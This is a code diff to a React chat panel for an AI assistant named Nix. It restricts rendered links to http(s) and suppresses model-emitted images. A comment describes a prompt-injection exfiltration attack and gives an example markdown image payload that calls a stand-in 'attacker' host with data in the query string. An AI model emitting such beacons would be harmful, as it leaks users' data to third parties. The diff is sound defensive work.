@@ -2,7 +2,7 @@
 
 import { isString } from "es-toolkit/compat";
 import { useCallback, useEffect, useRef, useState } from "react";
-import Markdown from "react-markdown";
+import Markdown, { type Components } from "react-markdown";
 import remarkGfm from "remark-gfm";
 import { fieldById } from "@/app/lib/config/rfq/fieldRegistry";
 import { fromISO, now, nowISO, nowMillis } from "@/app/lib/datetime";
@@ -21,6 +21,27 @@ import { useRfqWizardStore } from "@/app/lib/store/rfqWizardStore";
 import { NixWalkthroughBar } from "./NixWalkthroughBar";
 
 const NIX_SESSION_STORAGE_KEY = "nix-chat-session-id";
+
+const NIX_MARKDOWN_COMPONENTS: Components = {
+  a(props) {
+    const href = props.href;
+    const isSafeLink = isString(href) && /^https?:\/\//i.test(href);
+    if (!isSafeLink) {
+      return <span>{props.children}</span>;
+    }
+    return (
+      <a href={href} target="_blank" rel="noopener noreferrer nofollow">
+        {props.children}
+      </a>
+    );
+  },
+  // Suppress model-emitted images: a prompt-injected document could make Nix
+  // emit `![](https://attacker/p.png?d=…)` which the browser would auto-fetch
+  // (zero-click beacon / data-exfil). Nix responses never legitimately need images.
+  img() {
+    return null;
+  },
+};
 
 const AlertCircleIcon = ({ className }: { className?: string }) => (
   <svg
@@ -1188,7 +1209,9 @@ export function NixChatPanel(props: NixChatPanelProps) {
                       )}
                     </button>
                     <div className="text-sm prose prose-sm prose-gray dark:prose-invert max-w-none [&>*:first-child]:mt-0 [&>*:last-child]:mb-0 [&_table]:text-xs [&_table]:border-collapse [&_th]:bg-gray-200 dark:[&_th]:bg-gray-600 [&_th]:px-2 [&_th]:py-1 [&_td]:px-2 [&_td]:py-1 [&_th]:border [&_td]:border [&_th]:border-gray-300 dark:[&_th]:border-gray-500 [&_td]:border-gray-300 dark:[&_td]:border-gray-500 overflow-x-auto pr-6">
-                      <Markdown remarkPlugins={[remarkGfm]}>{message.content}</Markdown>
+                      <Markdown remarkPlugins={[remarkGfm]} components={NIX_MARKDOWN_COMPONENTS}>
+                        {message.content}
+                      </Markdown>
                     </div>
                   </div>
                 ) : (
@@ -1211,7 +1234,9 @@ export function NixChatPanel(props: NixChatPanelProps) {
           <div className="flex justify-start">
             <div className="rounded-lg px-3 py-2 bg-gray-100 dark:bg-gray-700 text-gray-900 dark:text-gray-100">
               <div className="text-sm prose prose-sm prose-gray dark:prose-invert max-w-none [&>*:first-child]:mt-0 [&>*:last-child]:mb-0">
-                <Markdown remarkPlugins={[remarkGfm]}>{streamingContent}</Markdown>
+                <Markdown remarkPlugins={[remarkGfm]} components={NIX_MARKDOWN_COMPONENTS}>
+                  {streamingContent}
+                </Markdown>
               </div>
               <div className="flex items-center gap-1 mt-1">
                 <div className="w-2 h-2 bg-orange-500 rounded-full animate-pulse"></div>
